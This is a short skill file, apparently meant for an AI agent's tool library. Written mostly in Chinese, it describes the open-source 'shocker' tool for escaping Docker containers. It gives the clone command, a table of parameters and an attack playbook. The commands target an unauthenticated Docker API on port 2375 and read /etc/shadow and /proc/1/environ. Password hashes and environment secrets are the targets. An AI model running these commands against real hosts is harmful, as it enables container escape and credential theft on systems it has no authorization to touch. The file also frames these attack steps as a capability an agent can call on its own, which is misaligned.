---
name: shocker-docker-escape
description: "shocker: Docker daemon abuse. Signals: cloud command execution, container escape."
zh-signals: "shocker: Docker 守护进程滥用。信号:云命令执行,容器逃逸。"
---

# shocker

- 攻击大类:C14 云与容器执行
- 上游仓库:https://github.com/nccgroup/shocker
- 上游 License:AGPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/nccgroup/shocker && cd shocker
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python shocker.py -H 10.0.0.5 -p 2375` | Docker API 逃逸 |
| `-H host -c 'cat /etc/shadow'` | 命令 |
| `-e` | 枚举 |

## 攻击场景 Playbook

### Docker 守护进程滥用

```bash
python shocker.py -H 10.0.0.5 -c 'cat /proc/1/environ'
# 未授权 2375 逃逸
```

## 注意事项

NCC 出品,Docker 逃逸工具。
